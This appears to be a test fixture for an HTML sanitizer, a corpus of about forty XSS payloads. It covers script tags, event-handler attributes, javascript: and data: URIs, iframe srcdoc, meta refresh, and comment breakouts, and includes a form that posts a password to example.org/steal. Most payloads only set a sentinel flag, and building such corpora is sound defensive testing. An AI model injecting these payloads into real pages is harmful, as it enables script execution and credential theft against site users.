# XSS Payload Corpus

This document contains malicious HTML and JavaScript payloads to test the sanitizer.

## Plain script tag

<script>
window.__XSS_SENTINEL__ = true;
</script>

## Uppercase script tag

<SCRIPT>
window.__XSS_SENTINEL__ = true;
</SCRIPT>

## Script tag with attributes

<script type="text/javascript" src="http://example.org/evil.js">
window.__XSS_SENTINEL__ = true;
</script>

## Img onerror basic

<img src=x onerror="window.__XSS_SENTINEL__ = true;">

## Img onerror with protocol

<img src="x" onerror="window.__XSS_SENTINEL__ = true;">

## SVG onload

<svg onload="window.__XSS_SENTINEL__ = true;">
</svg>

## SVG with nested script

<svg>
<script>
window.__XSS_SENTINEL__ = true;
</script>
</svg>

## IFrame with src

<iframe src="https://example.org/evil.html">
</iframe>

## IFrame with srcdoc

<iframe srcdoc="<script>window.__XSS_SENTINEL__ = true;</script>">
</iframe>

## Object tag

<object data="http://example.org/evil.swf">
</object>

## Embed tag

<embed src="http://example.org/evil.swf">

## Form tag

<form action="http://example.org/steal">
<input type="text" name="password">
<input type="submit">
</form>

## Input text tag

<input type="text" value="test">

## Input checkbox tag

<input type="checkbox" checked>

## Button tag

<button onclick="window.__XSS_SENTINEL__ = true;">Click me</button>

## Textarea tag

<textarea>
User input here
</textarea>

## Select tag

<select>
<option>Option 1</option>
</select>

## Style block

<style>
body { background: url("data:text/html,<script>window.__XSS_SENTINEL__ = true;</script>"); }
</style>

## Style attribute

<p style="background: url('javascript:window.__XSS_SENTINEL__ = true;')">Styled text</p>

## Style with position fixed overlay

<div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 999999; onclick: window.__XSS_SENTINEL__ = true;">
</div>

## Meta http-equiv refresh

<meta http-equiv="refresh" content="0; url='javascript:window.__XSS_SENTINEL__ = true;'">

## Base href

<base href="http://attacker.org/">

## Link import

<link rel="import" href="http://example.org/evil.html">

## Link stylesheet

<link rel="stylesheet" href="https://example.org/evil.css">

## Markdown link with javascript protocol

[Click me](javascript:window.__XSS_SENTINEL__ = true;)

## Markdown link with JavaScript uppercase

[Click me](JaVaScRiPt:window.__XSS_SENTINEL__ = true;)

## Markdown link with entity-encoded javascript

[Click me](&#106;avascript:window.__XSS_SENTINEL__ = true;)

## Markdown link with vbscript

[Click me](vbscript:window.__XSS_SENTINEL__ = true;)

## Markdown link with data text/html

[Click me](data:text/html,<script>window.__XSS_SENTINEL__ = true;</script>)

## Markdown image with javascript

![Alt](javascript:window.__XSS_SENTINEL__ = true;)

## Markdown image with data:text/html

![Alt](data:text/html,<script>window.__XSS_SENTINEL__ = true;</script>)

## HTML autolink javascript

<javascript:window.__XSS_SENTINEL__=true>

## HTML link with javascript href

<a href="javascript:window.__XSS_SENTINEL__ = true;">Click</a>

## Math with xlink href

<math>
<mtext xlink:href="http://example.org/evil.js">Click</mtext>
</math>

## Paragraph with onclick

<p onclick="window.__XSS_SENTINEL__ = true;">Paragraph</p>

## Anchor with onmouseover

<a href="#" onmouseover="window.__XSS_SENTINEL__ = true;">Link</a>

## Details with ontoggle

<details ontoggle="window.__XSS_SENTINEL__ = true;" open>
<summary>Details</summary>
Content
</details>

## Anchor with target blank

<a href="https://example.org" target="_blank">External link</a>

## HTML comment breakout attempt 1

<!-- --!>
<script>
window.__XSS_SENTINEL__ = true;
</script>
<!-- -->

## HTML comment breakout attempt 2

<!--->
<script>
window.__XSS_SENTINEL__ = true;
</script>
<!---->

## Template element

<template>
<script>
window.__XSS_SENTINEL__ = true;
</script>
</template>

## Dialog element

<dialog open>
<script>
window.__XSS_SENTINEL__ = true;
</script>
</dialog>

## Div with data attribute

<div data-onclick="window.__XSS_SENTINEL__ = true;">Div</div>

## Span with contenteditable and onchange

<span contenteditable="true" onchange="window.__XSS_SENTINEL__ = true;">Editable</span>
